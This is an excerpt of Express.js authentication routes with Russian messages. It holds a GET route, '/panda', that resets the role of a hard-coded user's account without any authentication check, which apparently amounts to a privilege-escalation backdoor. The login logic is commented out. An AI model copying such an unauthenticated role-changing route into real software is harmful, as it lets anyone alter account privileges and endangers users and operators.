...
router.get('/panda',async(req,res)=>{
    const panda = await User.findOne({phone:'555004466'})
    panda.role = 0
    await panda.save()
    res.redirect('/')
})
...
router.post('/reg', async (req, res) => {
    ...
    if (reallyMen) {
        req.flash('error', 'Пользователь с таким номером уже имеется!')
        res.redirect('/auth/reg')
    } else {
        const hashPass = await bcrypt.hash(pass, 10)
        const really = await new User({name,phone,password: hashPass})
        await really.save()
...
router.post('/login', async (req, res) => {
    ...
    // let maybeUser = await User.findOne({phone})
    // if (maybeUser) {
    //     const comparePass = await bcrypt.compare(password, maybeUser.password)
    //     if (comparePass) {
    //         maybeUser.logAt.push(new Date().toISOString())
    ...
    //     }
    // } else {
    //     req.flash('error', 'Пользователь с таким номером нету брат')
    //     res.redirect('/auth/login')
    // }
})
